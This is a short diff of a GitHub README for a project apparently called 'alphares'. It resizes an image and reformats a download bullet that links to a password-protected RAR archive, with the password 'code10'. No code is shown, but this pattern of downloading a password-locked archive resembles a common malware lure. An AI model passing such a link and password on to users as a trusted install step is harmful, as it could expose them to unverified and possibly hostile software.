@@ -6,13 +6,15 @@
 </div>
 
  <p align="center">
-    <img src="https://i.imgur.com/kT2cmoy.png" width="750">
+    <img src="https://i.imgur.com/kT2cmoy.png" width="500">
   </p>
 
 
 ## Download
 * Go to [Download](https://github.com/maxxximgb/alphares/releases/download/Latest/alphares.rar)
-*Password: code10
+* Password: code10
+
+
 ## FAQ
 
 Please **do not** open an issue before reading the FAQ, as I have answered the same question(s) several times in multiple places. If you still have a question or concern after reading the FAQ, then feel free to open an issue. However, you must provide adequate information. What happened? What were you doing? What have you tried to fix the issue?
